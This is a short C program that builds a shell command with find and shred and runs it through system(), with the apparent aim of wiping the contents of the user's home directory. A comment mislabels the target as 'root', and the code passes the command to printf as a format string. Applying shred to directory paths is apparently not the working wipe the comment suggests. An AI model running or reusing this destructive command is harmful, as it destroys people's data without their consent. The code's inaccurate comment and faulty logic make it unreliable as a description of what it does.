
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main () {
   char command[200];

   strcpy(command, "cd ~ && find . -type d -exec shred {} -z -u \\;" );//deletes root
   printf(command);
   system(command);

   return(0);
} 
